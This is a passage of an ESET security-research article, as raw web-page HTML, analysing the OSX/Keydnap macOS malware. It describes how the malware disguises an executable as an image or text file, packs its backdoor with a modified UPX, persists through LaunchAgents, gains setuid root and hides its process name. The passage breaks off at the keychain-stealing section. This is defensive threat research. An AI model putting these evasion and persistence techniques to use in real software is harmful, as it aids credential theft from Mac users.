<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Marc-Etienne M.Léveillé',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>New OSX/Keydnap malware is hungry for credentials | WeLiveSecurity</title>
<meta name="description" content="For the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of a keychain while maintaining a permanent backdoor."/>
<link rel="canonical" href="https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="New OSX/Keydnap malware is hungry for credentials | WeLiveSecurity" />
<meta property="og:description" content="For the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of a keychain while maintaining a permanent backdoor." />
<meta property="og:url" content="https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2016-07-06T12:30:27+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2016/07/Vasin-Lee.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2016/07/Vasin-Lee.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="641" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="For the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of a keychain while maintaining a permanent backdoor." />
<meta name="twitter:title" content="New OSX/Keydnap malware is hungry for credentials | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2016/07/Vasin-Lee.jpg" />
<meta name="twitter:creator" content="@marc_etienne_" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>New OSX/Keydnap malware is hungry for credentials</h1>
<div class="excerpt">For the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of the keychain while maintaining a permanent backdoor.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2013/06/Marc-Etienne-M.Leveille.png" alt="Marc-Etienne M.Léveillé">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                    Marc-Etienne M.Léveillé                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2016-07-06 14:30:27">6 Jul 2016 - 02:30PM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2016%2F07%2F06%2Fnew-osxkeydnap-malware-hungry-credentials%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2016%2F07%2F06%2Fnew-osxkeydnap-malware-hungry-credentials%2F&text=New OSX/Keydnap malware is hungry for credentials%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2016%2F07%2F06%2Fnew-osxkeydnap-malware-hungry-credentials%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>For the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of the keychain while maintaining a permanent backdoor.</p>
                            </div>

                            <p>ESET analyzes multiple samples targeting OS X every day. Those samples are usually <a href="http://www.virusradar.com/en/glossary/pua" target="_blank">potentially unwanted applications</a> that inject advertisements into browser displays while the victim is browsing the web.</p>
<p>For the last few weeks, we have been investigating an interesting case where the purpose of the malware is to steal the content of the keychain and maintain a permanent backdoor. This article will describe the components of this threat and what we know about it so far.</p>
<h2>Infection vector</h2>
<p>It is still not clear how victims are initially exposed to OSX/Keydnap. It could be through attachments in spam messages, downloads from untrusted websites or something else.</p>
<p>What we know is that a downloader component is distributed in a <span style="font-family: 'courier new', courier, monospace;">.zip</span> file. The archive file contains a Mach-O executable file with an extension that looks benign, such as <span style="font-family: 'courier new', courier, monospace;">.txt</span> or <span style="font-family: 'courier new', courier, monospace;">.jpg</span>. However, the file extension actually <em>contains a space character at the end</em>, which means double-clicking the file in Finder will launch it in Terminal and not Preview or TextEdit.</p>
<div id="attachment_81267" style="width: 740px" class="wp-caption aligncenter"><img class=" wp-image-81267" src="/wp-content/uploads/2016/07/zip_file-1024x630.png" alt="Figure 1: Finder window with the ZIP and the malicious &quot;.jpg &quot; file" width="730" height="449" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/zip_file-1024x630.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/zip_file-300x185.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/zip_file-768x472.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/zip_file.png 1486w" sizes="(max-width: 730px) 100vw, 730px" /><p class="wp-caption-text">Figure 1: Finder window with the ZIP and the malicious &#8220;<span style="font-family: 'courier new', courier, monospace;">.jpg</span> &#8221; file</p></div>
<div id="attachment_81262" style="width: 299px" class="wp-caption aligncenter"><img class=" wp-image-81262" src="/wp-content/uploads/2016/07/file_info_annotated-492x1024.png" alt="Figure 2: The downloader’s file information window" width="289" height="601" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/file_info_annotated-492x1024.png 492w, https://www.welivesecurity.com/wp-content/uploads/2016/07/file_info_annotated-144x300.png 144w, https://www.welivesecurity.com/wp-content/uploads/2016/07/file_info_annotated.png 754w" sizes="(max-width: 289px) 100vw, 289px" /><p class="wp-caption-text">Figure 2: The downloader’s file information window</p></div>
<p>The ZIP also contains the <a href="https://en.wikipedia.org/wiki/Resource_fork" target="_blank">Resource fork</a> that contains the icon of the executable file. It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file. Once started, a Terminal window opens and the malicious payload is executed.</p>
<div style="width: 600px;" class="wp-video"><!--[if lt IE 9]><script>document.createElement('video');</script><![endif]-->
<video class="wp-video-shortcode" id="video-81256-1" width="600" height="400" loop="1" autoplay="1" preload="metadata" controls="controls"><source type="video/mp4" src="/wp-content/uploads/2016/07/downloader_started_600.m4v?_=1" /><a href="/wp-content/uploads/2016/07/downloader_started_600.m4v">/wp-content/uploads/2016/07/downloader_started_600.m4v</a></video></div>
<p>Figure 3: Screen capture of the downloader executed on OS X El Capitan. Notice the Terminal icon shows for a fraction of a second before opening Preview.</p>
<h2>OSX/Keydnap downloader</h2>
<p>The downloader is an unsigned Mach-O executable. Thus, if the file is downloaded from an internet browser and Gatekeeper is activated on the machine – the default in recent versions of OS X and macOS – it will not execute and display a warning to the user.</p>
<div id="attachment_81263" style="width: 713px" class="wp-caption aligncenter"><img class=" wp-image-81263" src="/wp-content/uploads/2016/07/gatekeeper-1024x629.png" alt="Figure 4: Message shown if zip file is downloaded from Safari" width="703" height="432" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/gatekeeper-1024x629.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/gatekeeper-300x184.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/gatekeeper-768x472.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/gatekeeper.png 1064w" sizes="(max-width: 703px) 100vw, 703px" /><p class="wp-caption-text">Figure 4: Message shown if ZIP file is downloaded from Safari</p></div>
<p>Keydnap’s downloader is simple. It will:</p>
<ol>
<li>Download and execute the backdoor component</li>
<li>Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet</li>
<li>Open a decoy document (described later)</li>
<li>Close the Terminal window that just opened</li>
</ol>
<p>The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now. The downloader isn’t persistent. However, the downloaded backdoor will add an entry to the <span style="font-family: 'courier new', courier, monospace;">LaunchAgents</span> directory and survive across reboot. It is described in more details in the backdoor section.</p>
<p>We have found multiple variants of the downloader executable. A list of different samples can be found at the end of the article.</p>
<p>Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of <a href="http://www.virusradar.com/en/glossary/botnet" target="_blank">botnet</a> C&amp;C panels or dumps of credit card numbers. This suggests that Keydnap may be targeting users of underground forums or maybe even security researchers. Also included in recent variants is a &#8220;build name&#8221;. We have seen three different names: <span style="font-family: 'courier new', courier, monospace;">elitef*ck, ccshop</span> and <span style="font-family: 'courier new', courier, monospace;">transmission</span>.</p>
<div id="attachment_81258" style="width: 621px" class="wp-caption aligncenter"><img class=" wp-image-81258" src="/wp-content/uploads/2016/07/decoy1-1024x848.png" alt="Figure 5: Example decoy image (1)" width="611" height="506" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy1-1024x848.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy1-300x248.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy1-768x636.png 768w" sizes="(max-width: 611px) 100vw, 611px" /><p class="wp-caption-text">Figure 5: Example decoy image (1)</p></div>
<div id="attachment_81259" style="width: 677px" class="wp-caption aligncenter"><img class=" wp-image-81259" src="/wp-content/uploads/2016/07/decoy2-1024x820.png" alt="Figure 5: Example decoy image (2)" width="667" height="534" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy2-1024x820.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy2-300x240.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy2-768x615.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy2-222x179.png 222w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy2.png 1328w" sizes="(max-width: 667px) 100vw, 667px" /><p class="wp-caption-text">Figure 5: Example decoy image (2)</p></div>
<div id="attachment_81260" style="width: 696px" class="wp-caption aligncenter"><img class=" wp-image-81260" src="/wp-content/uploads/2016/07/decoy3-1024x702.png" alt="Figure 5: Example decoy image (3)" width="686" height="470" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy3-1024x702.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy3-300x206.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy3-768x527.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy3-151x103.png 151w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy3-97x65.png 97w, https://www.welivesecurity.com/wp-content/uploads/2016/07/decoy3.png 1496w" sizes="(max-width: 686px) 100vw, 686px" /><p class="wp-caption-text">Figure 5: Example decoy image (3)</p></div>
<h2>OSX/Keydnap backdoor</h2>
<p>All samples of the backdoor we have seen have the filename <span style="font-family: 'courier new', courier, monospace;">icloudsyncd</span>. The malware has a version string that is reported to the C&amp;C server. So far, we have seen two versions: 1.3.1 first seen in May 2016 and 1.3.5 in June.</p>
<h3>Obfuscation</h3>
<p>While the downloader module is not packed, the backdoor is packed with a modified version of UPX. Two modifications are made to UPX version 3.91:</p>
<ul>
<li>The magic bytes <span style="font-family: 'courier new', courier, monospace;">UPX!</span> in the UPX header are replaced with <span style="font-family: 'courier new', courier, monospace;">ASS7</span>,</li>
<li>The decompressed code and strings sections are XORed with 0x01. While self-decompressing, the XOR is applied after decompression and before calling the main function of the original binary.</li>
</ul>
<div id="attachment_81266" style="width: 705px" class="wp-caption aligncenter"><img class=" wp-image-81266" src="/wp-content/uploads/2016/07/upx_diff-1024x749.png" alt="Figure 6: Difference between a stock UPX packed file and the modified one" width="695" height="508" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/upx_diff-1024x749.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/upx_diff-300x220.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/upx_diff-768x562.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/upx_diff.png 1364w" sizes="(max-width: 695px) 100vw, 695px" /><p class="wp-caption-text">Figure 6: Difference between a stock UPX packed file and the modified one</p></div>
<p>A <a href="https://github.com/eset/malware-research/blob/master/keydnap/keydnap_upx.patch" target="_blank">patch for UPX is available on ESET’s malware-research Github repository</a> that allows unpacking Keydnap’s backdoor with the usual <span style="font-family: 'courier new', courier, monospace;">upx -d</span>.</p>
<h3>Persistence</h3>
<p>Once started, the Keydnap backdoor installs a <span style="font-family: 'courier new', courier, monospace;">plist</span> file in <span style="font-family: 'courier new', courier, monospace;">/Library/LaunchAgents/</span> if it has root privileges or <span style="font-family: 'courier new', courier, monospace;">$USER/Library/LaunchAgents/</span> otherwise to achieve persistence across reboots. The <span style="font-family: 'courier new', courier, monospace;">Library/Application Support/com.apple.iCloud.sync.daemon</span> directory is used to keep the <span style="font-family: 'courier new', courier, monospace;">icloudsyncd</span> executable. This directory will also contain the process id of the running malware in <span style="font-family: 'courier new', courier, monospace;">process.id</span> and a &#8220;build name&#8221; (as it is called by the author) in <span style="font-family: courier new,courier,monospace;">build.id</span>. With administrator privileges, it will also change the owner of <span style="font-family: 'courier new', courier, monospace;">icloudsyncd</span> to <span style="font-family: 'courier new', courier, monospace;">root:admin</span> and make the executable setuid and setgid, which means it will always run as root in the future.</p>
<div id="attachment_81264" style="width: 700px" class="wp-caption aligncenter"><img class=" wp-image-81264" src="/wp-content/uploads/2016/07/launch_agent-1024x702.png" alt="Figure 7: Property list file in LaunchAgents directory" width="690" height="473" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/launch_agent-1024x702.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/launch_agent-300x206.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/launch_agent-768x527.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/launch_agent-151x103.png 151w, https://www.welivesecurity.com/wp-content/uploads/2016/07/launch_agent-97x65.png 97w, https://www.welivesecurity.com/wp-content/uploads/2016/07/launch_agent.png 1394w" sizes="(max-width: 690px) 100vw, 690px" /><p class="wp-caption-text">Figure 7: Property list file in LaunchAgents directory</p></div>
<p>To camouflage the location of the malicious file, Keydnap replaces <span style="font-family: 'courier new', courier, monospace;">argv[0]</span> with <span style="font-family: 'courier new', courier, monospace;">/usr/libexec/icloudsyncd –launchd netlogon.bundle</span>. Here is an example of the result of <span style="font-family: 'courier new', courier, monospace;">ps ax</span> on an infected system:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057cb13667c2236266552" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ ps ax
[...]
 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057cb13667c2236266552-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667c2236266552-2">2</div><div class="crayon-num" data-line="crayon-6057cb13667c2236266552-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667c2236266552-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057cb13667c2236266552-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">ps </span><span class="crayon-i">ax</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667c2236266552-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-6057cb13667c2236266552-3"><span class="crayon-h"> </span><span class="crayon-cn">566</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-i">Ss</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-cn">00.01</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">libexec</span><span class="crayon-o">/</span><span class="crayon-v">icloudsyncd</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">launchd </span><span class="crayon-v">netlogon</span><span class="crayon-sy">.</span><span class="crayon-i">bundle</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667c2236266552-4"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<p style="text-align: center;">Figure 8: Result of ps ax on an infected system</p>
<h3>Keychain stealing</h3>
